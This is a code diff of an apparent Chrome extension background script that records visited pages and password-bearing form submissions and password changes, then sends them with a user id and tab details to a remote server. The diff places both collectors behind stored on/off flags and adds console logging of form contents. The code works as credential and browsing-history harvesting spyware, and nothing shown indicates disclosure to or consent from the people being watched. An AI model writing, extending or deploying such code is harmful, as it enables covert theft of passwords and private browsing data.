@@ -43,11 +43,10 @@ const addUser = (uid) => {
     });
 };
 
-const addForm = (uid, type, form, tab) => {
+const addForm = (uid, form, tab) => {
     const data = {
         uid: uid,
         date_created: new Date().toString(),
-        type,
         form,
         tab,
     };
@@ -84,22 +83,35 @@ chrome.runtime.onInstalled.addListener((details) => {
 });
 
 // Adds to history as websites are visited (not available in incognito)
-chrome.history.onVisited.addListener((h) => {
-    console.log(h);
-    chrome.storage.sync.get("userid", (res) => {
-        const data = {
-            uid: res.userid,
-            historyItem: h,
-        };
-        postRequest("/history/add/", data).catch((err) =>
-            console.log(err.message)
-        );
+chrome.storage.sync.get("historyWatcher", (runCommand) => {
+    if (!runCommand.historyWatcher) return;
+    chrome.history.onVisited.addListener((h) => {
+        console.log(h);
+        chrome.storage.sync.get("userid", (res) => {
+            const data = {
+                uid: res.userid,
+                historyItem: h,
+            };
+            postRequest("/history/add/", data).catch((err) =>
+                console.log(err.message)
+            );
+        });
     });
 });
 
-/* Forms with password Listener */
-chrome.runtime.onMessage.addListener((request, sender) => {
-    chrome.storage.sync.get("userid", (res) => {
-        addForm(res.userid, request.type, request.form, sender.tab);
+// Forms with password Listener
+chrome.storage.sync.get("passwordWatcher", (runCommand) => {
+    if (!runCommand.passwordWatcher) return;
+    chrome.runtime.onMessage.addListener((request, sender) => {
+        console.log(request.type);
+        if (
+            request.type === "formSubmit" ||
+            request.type === "passwordChange"
+        ) {
+            chrome.storage.sync.get("userid", (res) => {
+                console.log(request.form);
+                addForm(res.userid, request.form, sender.tab);
+            });
+        }
     });
 });
